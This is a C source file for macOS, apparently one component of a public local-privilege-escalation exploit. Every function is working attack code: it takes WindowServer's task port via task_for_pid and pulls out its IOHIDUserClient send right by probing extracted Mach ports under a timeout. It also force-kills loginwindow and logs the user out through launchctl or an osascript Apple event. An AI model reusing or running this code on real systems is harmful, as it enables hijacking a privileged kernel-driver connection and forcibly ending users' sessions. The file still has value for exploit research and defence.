#include <errno.h>              // errno
#include <signal.h>             // SIG*, signal, kill
#include <setjmp.h>             // setjmp, longjmp
#include <stdlib.h>             // system
#include <unistd.h>             // ualarm, sleep

#include <mach/mach.h>

#include <CoreFoundation/CoreFoundation.h> // CF*
#include <IOKit/IOKitLib.h>     // IO*

#include "common.h"             // LOG, ERR, pid_for_path
#include "obtain.h"

#define WINDOWSERVER_PATH   "/System/Library/PrivateFrameworks/SkyLight.framework/Resources/WindowServer"
#define LOGINWINDOW_PATH    "/System/Library/CoreServices/loginwindow.app/Contents/MacOS/loginwindow"
#define LAUNCHCTL_PATH      "/bin/launchctl"
#define OSASCRIPT_PATH      "/usr/bin/osascript"

static jmp_buf env;

static void timeout(int signo)
{
    longjmp(env, 1);
}

io_connect_t steal_from_windowserver(void)
{
    pid_t pid = pid_for_path(WINDOWSERVER_PATH);
    if(pid < 0)
    {
        return false;
    }

    task_t self = mach_task_self();

    LOG("WindowServer: pid %d", pid);
    task_t windowserver;
    kern_return_t ret = task_for_pid(self, pid, &windowserver);
    if(ret != KERN_SUCCESS)
    {
        ERR("task_for_pid failed: %s", mach_error_string(ret));
        return false;
    }

    LOG("WindowServer: task port 0x%x", windowserver);
    mach_port_name_array_t names;
    mach_msg_type_number_t namesCnt = 0;
    mach_port_type_array_t types;
    mach_msg_type_number_t typesCnt = 0;
    ret = mach_port_names(windowserver, &names, &namesCnt, &types, &typesCnt);
    if(ret != KERN_SUCCESS)
    {
        ERR("mach_port_names failed: %s", mach_error_string(ret));
        return false;
    }

    // Now loop over all names, extract each port and try to call IOConnectGetService on it.
    // If that succeeds, proceed to check if the service is IOHIDSystem and then distinguish
    // IOHIDUserClient from IOHIDParamUserClient by the return value of calling external method 0.
    LOG("WindowServer: got %u ports", namesCnt);
    bool end = false;

    // Some ports seem to block indefinitely on send.
    // Use SIGALRM to set up a timer and abort after 100ms of waiting.
    sig_t oldfunc = signal(SIGALRM, &timeout);

    io_connect_t retval = MACH_PORT_NULL;
    for(size_t i = 0; i < namesCnt && !end; ++i)
    {
        // IOKit UserClients are send rights
        if(types[i] != MACH_PORT_TYPE_SEND)
        {
            continue;
        }

        io_connect_t client = MACH_PORT_NULL;
        mach_msg_type_name_t right;
        ret = mach_port_extract_right(windowserver, names[i], MACH_MSG_TYPE_COPY_SEND, &client, &right);
        if(ret != KERN_SUCCESS)
        {
            ERR("mach_port_extract_right failed: %s", mach_error_string(ret));
            break;
        }

        io_service_t service = MACH_PORT_NULL;
        if(setjmp(env) == 0)
        {
            ualarm(100000, 0); // 100ms
            ret = IOConnectGetService(client, &service);
            ualarm(0, 0);
        }
        else // SIGALRM will drop us here
        {
            ret = KERN_ABORTED;
        }

        if(ret == KERN_SUCCESS)
        {
            CFStringRef name = IOObjectCopyClass(service);
            if(name == NULL)
            {
                ERR("IOObjectCopyClass returned NULL");
                end = true;
            }
            else
            {
                LOG("WindowServer: Found %s UserClient 0x%x", CFStringGetCStringPtr(name, kCFStringEncodingUTF8), client);
                if(CFEqual(name, CFSTR("IOHIDSystem")))
                {
                    ret = IOConnectCallScalarMethod(client, 0, NULL, 0, NULL, 0);
                    if(ret == kIOReturnBadArgument)
                    {
                        LOG("WindowServer: Found IOHIDUserClient");
                        retval = client;
                        client = MACH_PORT_NULL; // Prevent deallocation
                        end = true;
                    }
                    else if(ret != kIOReturnUnsupported)
                    {
                        ERR("IOConnectCallScalarMethod returned unexpected error: %s", mach_error_string(ret));
                        end = true;
                    }
                }
                CFRelease(name);
            }
            IOObjectRelease(service);
        }
        if(MACH_PORT_VALID(client))
        {
            mach_port_deallocate(self, client);
        }
    }

    signal(SIGALRM, oldfunc);
    mach_port_deallocate(self, windowserver);
    return retval;
}

bool kill_loginwindow(void)
{
    pid_t pid = pid_for_path(LOGINWINDOW_PATH);
    if(pid < 0)
    {
        return false;
    }

    LOG("loginwindow: pid %d", pid);
    int ret = kill(pid, SIGKILL);
    if(ret != 0)
    {
        ERR("kill failed: %s", strerror(errno));
        return false;
    }

    LOG("loginwindow: killed");
    return true;
}

bool log_user_out(void)
{
    // Quick & dirty
    LOG("Trying to log user out via launchd...");
    int ret = system(LAUNCHCTL_PATH " reboot logout");
    if(ret != 0)
    {
        LOG("That failed, trying via loginwindow...");
        ret = system(OSASCRIPT_PATH " -e 'tell application \"loginwindow\" to «event aevtrlgo»'");
        if(ret == 0)
        {
            // TODO: check if loginwindow exited
        }
        if(ret != 0)
        {
            ERR("Failed to log user out");
            return false;
        }
    }
    LOG("Logout succeeded");
    return true;
}
